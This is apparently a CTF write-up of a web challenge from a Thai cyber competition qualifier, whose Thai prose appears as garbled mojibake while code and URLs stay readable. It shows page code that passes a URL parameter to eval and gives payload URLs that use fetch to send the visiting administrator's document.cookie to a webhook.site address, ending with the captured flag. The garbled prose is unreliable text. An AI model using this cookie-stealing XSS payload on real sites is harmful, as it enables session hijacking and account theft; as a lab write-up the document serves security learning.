---
title: THCTT Qualifier (Junior) - DM Me
published: 2024-09-29
image: 'cover.png'
tags: ['Thailand Cyber Top Talent', 'Web Security']
category: 'CTF-Writeup'
draft: false 
language: 'th'
---

:::note
‡πÇ‡∏à‡∏ó‡∏¢‡πå‡∏£‡∏∞‡∏î‡∏±‡∏ö**‡∏¢‡∏≤‡∏Å**‡∏Ç‡∏≠‡∏á‡∏´‡∏°‡∏ß‡∏î‡∏´‡∏°‡∏π‡πà Web Application ‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏Ñ‡∏ô Solve ‡πÑ‡∏î‡πâ‡∏ô‡πâ‡∏≠‡∏¢‡∏°‡∏≤‡∏Å‡πÜ‡πÜ‡πÜ
:::

‡∏ñ‡πâ‡∏≤‡∏à‡∏≥‡πÑ‡∏°‡πà‡∏ú‡∏¥‡∏î ‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡∏à‡∏∞‡∏ö‡∏≠‡∏Å‡∏ß‡πà‡∏≤ ‡πÉ‡∏´‡πâ‡∏£‡∏±‡∏ô‡πÇ‡∏Ñ‡πâ‡∏î Javascript ‡πÉ‡∏´‡πâ‡πÑ‡∏î‡πâ ‡πÅ‡∏•‡∏∞‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏ú‡∏π‡πâ‡∏î‡∏π‡πÅ‡∏•‡∏£‡∏∞‡∏ö‡∏ö ‡∏°‡∏±‡πâ‡∏á

‡∏ã‡∏∂‡πà‡∏á‡∏ñ‡πâ‡∏≤‡∏°‡∏≤‡πÅ‡∏ô‡∏ß report ‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ ‡∏´‡∏ô‡∏µ‡πÑ‡∏°‡πà‡∏û‡πâ‡∏ô XSS ‡πÅ‡∏ô‡πà‡∏ô‡∏≠‡∏ô ‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏µ‡πà‡∏ß‡πà‡∏≤‡∏à‡∏∞‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏î‡∏µ‡∏Ç‡∏ô‡∏≤‡∏î‡πÑ‡∏´‡∏ô

‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÅ‡∏£‡∏Å‡∏ó‡∏µ‡πà‡∏ú‡∏°‡∏ó‡∏≥‡∏Å‡πá‡∏Ñ‡∏∑‡∏≠ view page source ‡πÄ‡∏•‡∏¢

‡∏à‡∏∞‡∏û‡∏ö‡πÇ‡∏Ñ‡πâ‡∏î‡∏ä‡∏∏‡∏î‡∏ô‡∏µ‡πâ

```js
<script>
    // JavaScript for showing stickers based on URL parameter
    function showSticker() {
        const params = new URLSearchParams(window.location.search);
        const stickerId = params.get('id');
        if (stickerId) {
            document.getElementById('sticker-display').innerHTML = `<h3>${stickerId}</h3>`;
            // Vulnerable to XSS if 'id' contains malicious script code
            eval(stickerId);
        }
    }
</script>
```

‡∏ã‡∏∂‡πà‡∏á ‡∏°‡∏±‡∏ô‡∏Å‡πá‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ß‡πâ‡πÄ‡∏•‡∏¢‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà ‡∏ö‡∏≠‡∏Å‡∏î‡πâ‡∏ß‡∏¢‡∏ß‡πà‡∏≤‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏≠‡∏∞‡πÑ‡∏£ ‡πÅ‡∏•‡∏∞‡∏ó‡∏≥‡∏¢‡∏±‡∏á‡πÑ‡∏á

‡πÄ‡∏´‡∏•‡∏∑‡∏≠‡πÅ‡∏Ñ‡πà‡πÉ‡∏´‡πâ exploit script ‡∏°‡∏≤‡∏î‡πâ‡∏ß‡∏¢ ‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏à‡∏ö‡πÅ‡∏•‡πâ‡∏ß‡∏Ç‡πâ‡∏≠‡∏ô‡∏µ‡πâ ‡πÅ‡∏ï‡πà‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏°‡∏≤‡πÉ‡∏´‡πâ‡∏´‡∏£‡∏≠‡∏Åüò≥

‡πÅ‡∏•‡πâ‡∏ß‡∏ú‡∏°‡∏Å‡πá‡∏•‡∏≠‡∏á‡πÄ‡∏ä‡πá‡∏Ñ‡∏î‡∏π‡∏ß‡πà‡∏≤‡∏°‡∏±‡∏ô XSS ‡πÑ‡∏î‡πâ‡∏à‡∏£‡∏¥‡∏á‡∏õ‡πà‡∏≤‡∏ß ‡∏î‡πâ‡∏ß‡∏¢‡∏Å‡∏≤‡∏£‡πÉ‡∏™‡πà‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á Javascript ‡∏á‡πà‡∏≤‡∏¢‡πÜ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ

![alt text](image.png)

‡πÇ‡∏≠‡πÄ‡∏Ñ ‡πÅ‡∏à‡πã‡∏ß‡∏ß‡∏ß

![alt text](image-1.png)

‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏ú‡∏°‡∏à‡∏∞‡∏•‡∏≠‡∏á‡πÉ‡∏´‡πâ‡∏°‡∏±‡∏ô Trigger ‡πÑ‡∏õ‡∏ó‡∏µ‡πà webhook ‡∏ó‡∏µ‡πà‡∏ú‡∏°‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡πÑ‡∏ß‡πâ

`http://thctt24.junior.web3.local/?id=fetch(%22https://webhook.site/redacted%22)`

![alt text](image-2.png)

‡πÇ‡∏≠‡πÄ‡∏Ñ‡∏°‡∏≤‡∏à‡∏£‡∏¥‡∏á‡∏á

![alt text](image-3.png)

‡∏ú‡∏°‡∏Å‡πá‡πÄ‡∏•‡∏¢ ‡πÄ‡∏≠‡∏≤‡∏•‡∏¥‡πâ‡∏á‡∏ô‡∏±‡πâ‡∏ô‡πÑ‡∏õ‡∏™‡πà‡∏á‡πÉ‡∏´‡πâ‡∏ú‡∏π‡πâ‡∏î‡∏π‡πÅ‡∏•‡∏£‡∏∞‡∏ö‡∏ö

![alt text](image-4.png)

‡∏ó‡∏µ‡πà‡∏ú‡∏°‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏û‡∏¥‡πà‡∏° :3000 ‡∏ï‡πà‡∏≠‡∏ó‡πâ‡∏≤‡∏¢ domain ‡∏Å‡πá‡∏Ñ‡∏∑‡∏≠ ‡πÉ‡∏ô docker ‡∏ú‡∏°‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏õ‡πá‡∏ô port 3000 ‡πÑ‡∏ß‡πâ

‡∏ô‡∏µ‡πà‡πà‡πà ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡∏ß‡πà‡∏≤ request ‡∏°‡∏≤‡∏à‡∏≤‡∏Å‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏ú‡∏π‡πâ‡∏î‡∏π‡πÅ‡∏•‡∏£‡∏∞‡∏ö‡∏ö‡∏à‡∏£‡∏¥‡∏á ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏£‡∏≤

![alt text](image-5.png)

‡πÉ‡∏ô‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ú‡∏π‡πâ‡∏î‡∏π‡πÅ‡∏•‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏ô‡∏µ‡πâ‡πÑ‡∏î‡πâ‡πÅ‡∏•‡πâ‡∏ß ‡∏¢‡∏±‡∏á‡πÑ‡∏á‡∏Å‡πá‡∏ï‡πâ‡∏≠‡∏á‡∏°‡∏µ Cookie ‡πÅ‡∏ô‡∏ö‡∏°‡∏≤‡∏î‡πâ‡∏ß‡∏¢‡πÅ‡∏ô‡πà‡∏ô‡∏≠‡∏ô ‡πÄ‡∏•‡∏¢‡∏Ç‡∏≠‡∏™‡πà‡∏≠‡∏á‡∏´‡∏ô‡πà‡∏≠‡∏¢‡∏•‡∏∞‡∏Å‡∏±‡∏ô

`http://thctt24.junior.web3.local:3000/?id=fetch(%22https://webhook.site/redacted/%22%2Bdocument.cookie)`

‡πÇ‡∏≠‡πÄ‡∏Ñ ‡∏ú‡πà‡∏≤‡∏ô‡∏â‡∏•‡∏∏‡∏¢‡∏¢

![alt text](image-6.png)

‡πÄ‡∏£‡∏≤‡∏Å‡πá‡∏à‡∏∞‡πÑ‡∏î‡πâ FLAG ‡∏°‡∏≤‡πÅ‡∏•‡πâ‡∏ß‡∏ß

![alt text](image-7.png)

‡∏≠‡∏±‡∏ô‡∏ô‡∏µ‡πâ FLAG ‡∏à‡∏≤‡∏Å‡πÉ‡∏ô‡∏á‡∏≤‡∏ô‡πÅ‡∏Ç‡πà‡∏á‡πÄ‡∏•‡∏¢

`THCTT24{840524576a4723b08d0ec38db4fb384a}`